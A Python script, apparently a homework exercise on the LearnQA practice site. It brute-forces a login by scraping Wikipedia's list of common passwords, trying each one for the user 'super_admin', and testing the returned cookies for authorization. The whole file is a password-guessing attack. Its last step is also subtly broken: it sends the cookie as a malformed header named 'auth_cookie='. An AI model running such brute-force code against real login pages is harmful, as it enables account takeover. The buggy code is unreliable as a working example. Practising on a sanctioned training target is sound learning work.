import json
import requests
from bs4 import BeautifulSoup
import re

get_cookie = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
pass_link = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords"
check_cookie = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"


def list_password(response, selector):
    soup = BeautifulSoup(response.text, "html.parser")
    my_table = soup.select(selector)[1]
    my_table = re.sub('<[^>]*>', '', str(my_table))
    list_tab = my_table.split("\n")
    new_list = [i for i in list_tab if i != ""]
    return new_list


response_pass = requests.get(pass_link)
pass_list = list_password(response_pass, 'table.wikitable')


# print(pass_list)


def make_cookie():
    username = "super_admin"
    list_cookie = []
    for i in pass_list:
        response_get_cookie = requests.post(get_cookie, data={'login': username, "password": i})
        head = json.dumps(dict(response_get_cookie.headers))
        json_headers_response = json.loads(head)
        key_in_dict = json_headers_response.get("Set-Cookie")
        auth_cookie = key_in_dict.split(";")[0]
        list_cookie.append(auth_cookie)
    return list_cookie


lscokie = make_cookie()
print(lscokie)


def broot(cookie):
    for i in cookie:
        one = str(i).split("=")[1]
        headers = {'auth_cookie=': one}
        response_broot = requests.post(check_cookie, headers=headers)
        if response_broot.text == "You are authorized":
            print(response_broot.text)


broot(lscokie)
